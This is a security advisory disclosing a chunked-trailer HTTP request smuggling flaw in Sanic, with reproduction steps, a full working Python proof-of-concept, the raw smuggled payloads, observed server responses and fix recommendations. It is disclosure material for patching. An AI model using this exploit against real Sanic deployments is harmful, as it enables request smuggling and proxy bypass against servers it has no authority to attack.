# sanic chunked trailer request smuggling allows hidden second request execution

- GHSA: GHSA-wmj6-g64g-j7q5
- CVE: CVE-2026-85078
- Published: 2026-09-17T14:59:16Z
- GHSA severity: medium
- CVSS v3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L (6.5)
- CWE: CWE-444
- Packages: pip:sanic, pip:sanic
- Source: https://github.com/advisories/GHSA-wmj6-g64g-j7q5

---

## Description

Sanic's HTTP/1.1 chunked-body handling does not fully consume the `trailer-part` after the terminating `0\r\n` chunk. Because of that, attacker-controlled bytes left in the connection buffer after the first chunked request can be interpreted as the start of a new HTTP request on the same keep-alive connection. In the attached verified proof, a single outer `POST /` request that correctly returns `405 Method Not Allowed` is followed, within the same TCP send, by a hidden second request smuggled through the chunked trailer area. Sanic parses and executes that second request as a real independent request.

The issue is a request-boundary integrity failure in Sanic's core HTTP/1.1 parser. The verified impact is not speculative. The attached proof shows that one TCP payload produces two server responses: first the expected `405` for the outer `POST /`, then a separate `200 OK` for a hidden `GET /`. A second exploit variant changes the hidden request path and receives a real `404 Not Found`, proving that the hidden second request is not a hard-coded artifact but an actually routed backend request. A control case with a two-character trailer field name shifts the leftover bytes from `GET` to `:GET`, which changes the second response accordingly and confirms that the root cause is incorrect trailer consumption rather than legitimate pipelining.

## Steps To Reproduce

1. Start a Sanic HTTP/1.1 service on a keep-alive connection path. In the verified run, the local target listened on `127.0.0.1:9381` and the root route allowed `GET /` but not `POST /`.
2. From the package root, run the provided PoC:

```bash
python3 evidence/vuln_001_chunked_trailer_smuggle.py | tee evidence/vuln_001_chunked_trailer_smuggle.run.txt
```

3. Review the baseline case in `evidence/vuln_001_chunked_trailer_smuggle.run.txt`. A normal chunked request with `0\r\n\r\n` returns exactly one response block:

```text
=== CASE: baseline_no_trailer ===
Received response blocks: 1
HTTP/1.1 405 Method Not Allowed
```

4. Review the exploit case that hides `GET /` in the trailer area:

```text
=== CASE: exploit_smuggled_root ===
```

The PoC sends a single TCP payload containing:

```text
POST / HTTP/1.1
Host: 127.0.0.1:9381
Connection: keep-alive
Transfer-Encoding: chunked

1
X
0
a:GET / HTTP/1.1
Host: 127.0.0.1:9381
```

5. Confirm that Sanic returns two response blocks from that one send:

```text
Received response blocks: 2
HTTP/1.1 405 Method Not Allowed
...
HTTP/1.1 200 OK
...
{"test":true}
```

6. Review the second exploit case that changes the smuggled request path to a nonexistent route:

```text
=== CASE: exploit_smuggled_404 ===
```

Confirm that Sanic again returns two response blocks and that the second response is a real routed `404 Not Found` for the attacker-controlled hidden path.
7. Review the control case with a two-character trailer field name:

```text
=== CASE: offset_control_two_char_field_name ===
```

Confirm that the second request is now interpreted as `:GET /`, producing a second `405` with `Method :GET not allowed for URL /`. This demonstrates that the leftover bytes begin at a parser offset inside the trailer region and are then reinterpreted as a new request line.

## Recommendations

After parsing the terminating `0` chunk, Sanic must continue parsing and fully consuming the `trailer-part` until the final empty line before the connection buffer is reused. If trailer support is not intended, the safer behavior is to reject any request that contains bytes after the terminating `0\r\n` other than the expected final empty line, and then close the connection instead of keeping it alive.

Add regression coverage for all three cases shown in the evidence: a normal `0\r\n\r\n` chunked termination, a legal trailer that must be fully consumed, and a malicious trailer that must never cause a second backend request to be parsed. The fix needs to guarantee that no bytes from trailer processing can remain in the buffer as a candidate next request.

## poc

```python
#!/usr/bin/env python3
"""Proof of concept for HTTP/1.1 chunked trailer request injection."""

from __future__ import annotations

import socket
from dataclasses import dataclass
from typing import Iterable


TARGET = "sanic-org/sanic"
BASE_URL = "http://127.0.0.1:9381"
HOST = "127.0.0.1"
PORT = 9381
TIMEOUT = 1.0
PROXY = None
AUTH_HEADERS: dict[str, str] = {}


@dataclass
class Case:
    name: str
    payload: bytes
    expected_responses: int
    expected_markers: tuple[bytes, ...]


def build_prefix() -> bytes:
    return (
        b"POST / HTTP/1.1\r\n"
        + f"Host: {HOST}:{PORT}\r\n".encode()
        + b"Connection: keep-alive\r\n"
        + b"Transfer-Encoding: chunked\r\n"
        + b"\r\n"
        + b"1\r\n"
        + b"X\r\n"
    )


def build_case_payload(path: str | None = None, field_name: str = "a") -> bytes:
    prefix = build_prefix()
    if path is None:
        return prefix + b"0\r\n\r\n"
    return (
        prefix
        + b"0\r\n"
        + f"{field_name}:GET {path} HTTP/1.1\r\n".encode()
        + f"Host: {HOST}:{PORT}\r\n".encode()
        + b"\r\n"
    )


def send_payload(payload: bytes) -> bytes:
    response = bytearray()
    with socket.create_connection((HOST, PORT), timeout=3) as sock:
        sock.sendall(payload)
        sock.settimeout(TIMEOUT)
        while True:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            response.extend(chunk)
    return bytes(response)


def count_http_responses(response: bytes) -> int:
    return response.count(b"HTTP/1.1 ")


def ensure_markers(case: Case, response: bytes) -> None:
    actual_count = count_http_responses(response)
    if actual_count != case.expected_responses:
        raise SystemExit(
            f"[FAIL] {case.name}: expected {case.expected_responses} responses, got {actual_count}"
        )
    for marker in case.expected_markers:
        if marker not in response:
            raise SystemExit(
                f"[FAIL] {case.name}: missing marker {marker.decode('latin1', 'replace')}"
            )


def render_payload(payload: bytes) -> str:
    return payload.decode("latin1", "replace")


def render_response(response: bytes) -> str:
    return response.decode("latin1", "replace")


def iter_cases() -> Iterable[Case]:
    yield Case(
        name="baseline_no_trailer",
        payload=build_case_payload(),
        expected_responses=1,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"Method POST not allowed for URL /",
        ),
    )
    yield Case(
        name="exploit_smuggled_root",
        payload=build_case_payload("/"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"HTTP/1.1 200 OK",
            b'{"test":true}',
        ),
    )
    yield Case(
        name="exploit_smuggled_404",
        payload=build_case_payload("/this-path-should-not-exist"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"HTTP/1.1 404 Not Found",
            b"Requested URL /this-path-should-not-exist not found",
        ),
    )
    yield Case(
        name="offset_control_two_char_field_name",
        payload=build_case_payload("/", field_name="ab"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"Method :GET not allowed for URL /",
        ),
    )


def main() -> None:
    print(f"Target: {TARGET}")
    print(f"Base URL: {BASE_URL}")
    print()
    for case in iter_cases():
        print(f"=== CASE: {case.name} ===")
        print("Sent payload:")
        print(render_payload(case.payload))
        response = send_payload(case.payload)
        ensure_markers(case, response)
        print(f"Received response blocks: {count_http_responses(response)}")
        print("Raw response:")
        print(render_response(response))
        print("[OK] Case verified")
        print()


if __name__ == "__main__":
    main()
```

## Evidence Files

The attachment package includes the exact PoC and the full runtime output from the verified local execution.

- `evidence/vuln_001_chunked_trailer_smuggle.py`: full PoC used for the verified run.
- `evidence/vuln_001_chunked_trailer_smuggle.run.txt`: runtime output showing the baseline behavior, the successful smuggled `GET /` execution, the successful smuggled `GET /this-path-should-not-exist` execution, and the trailer-offset control case.

Observed baseline behavior:

```text
=== CASE: baseline_no_trailer ===
Received response blocks: 1
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /
```

Observed hidden second request execution:

```text
=== CASE: exploit_smuggled_root ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 200 OK
...
{"test":true}
```

Observed hidden attacker-controlled path execution:

```text
=== CASE: exploit_smuggled_404 ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 404 Not Found
...
Requested URL /this-path-should-not-exist not found
```

Observed trailer-offset control:

```text
=== CASE: offset_control_two_char_field_name ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 405 Method Not Allowed
...
Method :GET not allowed for URL /
```

## Impact

An attacker who can send a chunked HTTP/1.1 request to a Sanic backend can cause the backend to interpret bytes from the trailer region as a second request on the same keep-alive connection. In the verified proof, that second request was fully routed and executed by the backend even though only one outer request was sent by the client.

This breaks the integrity of HTTP request boundaries inside the server. In real deployments that place Sanic behind reverse proxies, gateways, caches, or other intermediaries, a backend parser mismatch of this kind can become a request smuggling primitive with broader security consequences than the local proof route demonstrates.
